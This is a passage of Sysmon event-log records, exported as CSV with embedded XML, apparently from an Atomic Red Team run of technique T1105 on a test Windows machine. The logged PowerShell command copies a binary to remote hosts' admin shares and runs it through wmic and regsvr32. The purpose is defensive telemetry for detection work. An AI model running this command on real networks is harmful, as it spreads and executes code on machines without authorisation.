{if (test-connection -Count 1 -computername $machine -quiet) 
{cmd /c copy \""""$env:comspec\"""" \""""\\$machine\C$\Windows\Temp\T1105.exe\""""
echo $machine >> \""""$completed_list\""""
wmic /node: \""""$machine\"""" process call create \""""regsvr32.exe /i C:\Windows\Temp\T1105.exe\""""}
else
{echo $machine >> \""""$offline_list\""""}}}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,1,19644,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:22.699

ProcessGuid: {f57bd86a-8d5a-658c-0702-000000000f00}

ProcessId: 6664

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {$machine_list = \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1105MachineList.txt\""""
$offline_list = \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1105OfflineHosts.txt\""""
$completed_list = \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1105CompletedHosts.txt\""""
foreach ($machine in get-content -path \""""$machine_list\"""")
{if (test-connection -Count 1 -computername $machine -quiet) 
{cmd /c copy \""""$env:comspec\"""" \""""\\$machine\C$\Windows\Temp\T1105.exe\""""
echo $machine >> \""""$completed_list\""""
wmic /node: \""""$machine\"""" process call create \""""regsvr32.exe /i C:\Windows\Temp\T1105.exe\""""}
else
{echo $machine >> \""""$offline_list\""""}}}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,,{f57bd86a-8d5a-658c-0702-000000000f00},3588,6664,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:47:22.7007550Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:22.699,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:22.7007550Z""/>
      <EventRecordID>19644</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:22.699</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d5a-658c-0702-000000000f00}</Data>
      <Data Name=""ProcessId"">6664</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {$machine_list = \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1105MachineList.txt\""""
$offline_list = \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1105OfflineHosts.txt\""""
$completed_list = \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1105CompletedHosts.txt\""""
foreach ($machine in get-content -path \""""$machine_list\"""")
{if (test-connection -Count 1 -computername $machine -quiet) 
{cmd /c copy \""""$env:comspec\"""" \""""\\$machine\C$\Windows\Temp\T1105.exe\""""
echo $machine &gt;&gt; \""""$completed_list\""""
wmic /node: \""""$machine\"""" process call create \""""regsvr32.exe /i C:\Windows\Temp\T1105.exe\""""}
else
{echo $machine &gt;&gt; \""""$offline_list\""""}}}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:22.699

ProcessGuid: {f57bd86a-8d5a-658c-0702-000000000f00}

ProcessId: 6664

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {$machine_list = \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1105MachineList.txt\""""
$offline_list = \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1105OfflineHosts.txt\""""
$completed_list = \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1105CompletedHosts.txt\""""
foreach ($machine in get-content -path \""""$machine_list\"""")
{if (test-connection -Count 1 -computername $machine -quiet) 
{cmd /c copy \""""$env:comspec\"""" \""""\\$machine\C$\Windows\Temp\T1105.exe\""""
echo $machine &gt;&gt; \""""$completed_list\""""
wmic /node: \""""$machine\"""" process call create \""""regsvr32.exe /i C:\Windows\Temp\T1105.exe\""""}
else
{echo $machine &gt;&gt; \""""$offline_list\""""}}}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,Taskkill  /IM Calculator.exe /F,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Terminates Processes,1,19643,10.0.22621.1 (WinBuild.160101.0800),"MD5=050ED22BB515A81ED6FC73D042CE5DB4,SHA256=75F4AED9BF21D8F9B2B1A2DDBC1F2C7E4E0AEF8B3B94BD5EDA02D9D84C34F33F,IMPHASH=86AA9A65A9C8E606B1E09C96AE58BACC",C:\Windows\System32\taskkill.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:22.350

ProcessGuid: {f57bd86a-8d5a-658c-0602-000000000f00}

ProcessId: 9516

Image: C:\Windows\System32\taskkill.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Terminates Processes

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: taskkill.exe

CommandLine: Taskkill  /IM Calculator.exe /F

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=050ED22BB515A81ED6FC73D042CE5DB4,SHA256=75F4AED9BF21D8F9B2B1A2DDBC1F2C7E4E0AEF8B3B94BD5EDA02D9D84C34F33F,IMPHASH=86AA9A65A9C8E606B1E09C96AE58BACC

ParentProcessGuid: {f57bd86a-8d4f-658c-f201-000000000f00}

ParentProcessId: 5620

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\T1105\src\T1105.bat"" 1>NUL

ParentUser: WINDEV2309EVAL\User",Info,taskkill.exe,"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\T1105\src\T1105.bat"" 1>NUL",C:\Windows\System32\cmd.exe,{f57bd86a-8d4f-658c-f201-000000000f00},5620,WINDEV2309EVAL\User,,{f57bd86a-8d5a-658c-0602-000000000f00},3588,9516,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:47:22.3548125Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:22.350,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:22.3548125Z""/>
      <EventRecordID>19643</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:22.350</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d5a-658c-0602-000000000f00}</Data>
      <Data Name=""ProcessId"">9516</Data>
      <Data Name=""Image"">C:\Windows\System32\taskkill.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Terminates Processes</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">taskkill.exe</Data>
      <Data Name=""CommandLine"">Taskkill  /IM Calculator.exe /F</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=050ED22BB515A81ED6FC73D042CE5DB4,SHA256=75F4AED9BF21D8F9B2B1A2DDBC1F2C7E4E0AEF8B3B94BD5EDA02D9D84C34F33F,IMPHASH=86AA9A65A9C8E606B1E09C96AE58BACC</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-8d4f-658c-f201-000000000f00}</Data>
      <Data Name=""ParentProcessId"">5620</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\T1105\src\T1105.bat"" 1&gt;NUL</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:22.350

ProcessGuid: {f57bd86a-8d5a-658c-0602-000000000f00}

ProcessId: 9516

Image: C:\Windows\System32\taskkill.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Terminates Processes

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: taskkill.exe

CommandLine: Taskkill  /IM Calculator.exe /F

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=050ED22BB515A81ED6FC73D042CE5DB4,SHA256=75F4AED9BF21D8F9B2B1A2DDBC1F2C7E4E0AEF8B3B94BD5EDA02D9D84C34F33F,IMPHASH=86AA9A65A9C8E606B1E09C96AE58BACC

ParentProcessGuid: {f57bd86a-8d4f-658c-f201-000000000f00}

ParentProcessId: 5620

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\T1105\src\T1105.bat"" 1&gt;NUL

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,Taskkill  /IM notepad.exe /F,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Terminates Processes,1,19642,10.0.22621.1 (WinBuild.160101.0800),"MD5=050ED22BB515A81ED6FC73D042CE5DB4,SHA256=75F4AED9BF21D8F9B2B1A2DDBC1F2C7E4E0AEF8B3B94BD5EDA02D9D84C34F33F,IMPHASH=86AA9A65A9C8E606B1E09C96AE58BACC",C:\Windows\System32\taskkill.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:22.241

ProcessGuid: {f57bd86a-8d5a-658c-0502-000000000f00}

ProcessId: 5112

Image: C:\Windows\System32\taskkill.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Terminates Processes

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: taskkill.exe

CommandLine: Taskkill  /IM notepad.exe /F

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=050ED22BB515A81ED6FC73D042CE5DB4,SHA256=75F4AED9BF21D8F9B2B1A2DDBC1F2C7E4E0AEF8B3B94BD5EDA02D9D84C34F33F,IMPHASH=86AA9A65A9C8E606B1E09C96AE58BACC

ParentProcessGuid: {f57bd86a-8d4f-658c-f201-000000000f00}

ParentProcessId: 5620

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\T1105\src\T1105.bat"" 1>NUL

ParentUser: WINDEV2309EVAL\User",Info,taskkill.exe,"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\T1105\src\T1105.bat"" 1>NUL",C:\Windows\System32\cmd.exe,{f57bd86a-8d4f-658c-f201-000000000f00},5620,WINDEV2309EVAL\User,,{f57bd86a-8d5a-658c-0502-000000000f00},3588,5112,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:47:22.2444310Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:22.241,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:22.2444310Z""/>
      <EventRecordID>19642</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:22.241</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d5a-658c-0502-000000000f00}</Data>
      <Data Name=""ProcessId"">5112</Data>
      <Data Name=""Image"">C:\Windows\System32\taskkill.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Terminates Processes</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">taskkill.exe</Data>
      <Data Name=""CommandLine"">Taskkill  /IM notepad.exe /F</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=050ED22BB515A81ED6FC73D042CE5DB4,SHA256=75F4AED9BF21D8F9B2B1A2DDBC1F2C7E4E0AEF8B3B94BD5EDA02D9D84C34F33F,IMPHASH=86AA9A65A9C8E606B1E09C96AE58BACC</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-8d4f-658c-f201-000000000f00}</Data>
      <Data Name=""ParentProcessId"">5620</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\T1105\src\T1105.bat"" 1&gt;NUL</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:22.241

ProcessGuid: {f57bd86a-8d5a-658c-0502-000000000f00}

ProcessId: 5112

Image: C:\Windows\System32\taskkill.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Terminates Processes

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: taskkill.exe

CommandLine: Taskkill  /IM notepad.exe /F

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=050ED22BB515A81ED6FC73D042CE5DB4,SHA256=75F4AED9BF21D8F9B2B1A2DDBC1F2C7E4E0AEF8B3B94BD5EDA02D9D84C34F33F,IMPHASH=86AA9A65A9C8E606B1E09C96AE58BACC

ParentProcessGuid: {f57bd86a-8d4f-658c-f201-000000000f00}

ParentProcessId: 5620

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\T1105\src\T1105.bat"" 1&gt;NUL

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,22,19641,,,<unknown process>,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:54:19.060

ProcessGuid: {00000000-0000-0000-0000-000000000000}

ProcessId: 10344

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;

Image: <unknown process>

User: WINDEV2309EVAL\User",Info,,,,,,,,{00000000-0000-0000-0000-000000000000},3588,10344,,raw.githubusercontent.com,::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;,0,"
      ",-,2023-12-27T20:47:13.5126009Z,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:54:19.060,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:13.5126009Z""/>
      <EventRecordID>19641</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:54:19.060</Data>
      <Data Name=""ProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ProcessId"">10344</Data>
      <Data Name=""QueryName"">raw.githubusercontent.com</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;</Data>
      <Data Name=""Image"">&lt;unknown process&gt;</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:54:19.060

ProcessGuid: {00000000-0000-0000-0000-000000000000}

ProcessId: 10344

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;

Image: &lt;unknown process&gt;

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
